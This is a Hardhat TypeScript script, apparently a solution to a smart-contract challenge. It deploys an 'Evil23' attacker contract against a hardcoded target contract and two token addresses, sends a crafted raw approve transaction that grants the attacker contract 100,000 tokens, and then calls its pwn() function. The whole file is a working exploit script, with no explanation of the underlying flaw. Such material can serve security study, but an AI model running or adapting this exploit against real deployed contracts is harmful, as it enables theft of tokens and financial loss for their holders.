import { ethers } from "hardhat";
import { Evil23__factory } from "../typechain-types";

async function main() {
  let [deployer] = await ethers.getSigners();

  let contract = "0x4dEFe07dEC19aBCF14a833ca0CD95cd537b03dE6";
  let tokenA = "0xC30E36467AC34811de05Bec5a61F39B9D5Fc1b88";
  let tokenB = "0xfDE370C2Fa3e1Af23466F61BfF6Fe792329f5Bea";

  let abi = ["function approve(address,uint)"];
  let iface = new ethers.utils.Interface(abi);

  let evil = await new Evil23__factory(deployer).deploy(
    contract,
    tokenA,
    tokenB
  );

  let payload = iface.encodeFunctionData("approve", [
    evil.address,
    ethers.utils.parseEther("100000"),
  ]);

  await deployer.sendTransaction({
    to: contract,
    data: payload,
    gasLimit: 100_000,
  });

  let tx = await evil.pwn({ gasLimit: 500_000 });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
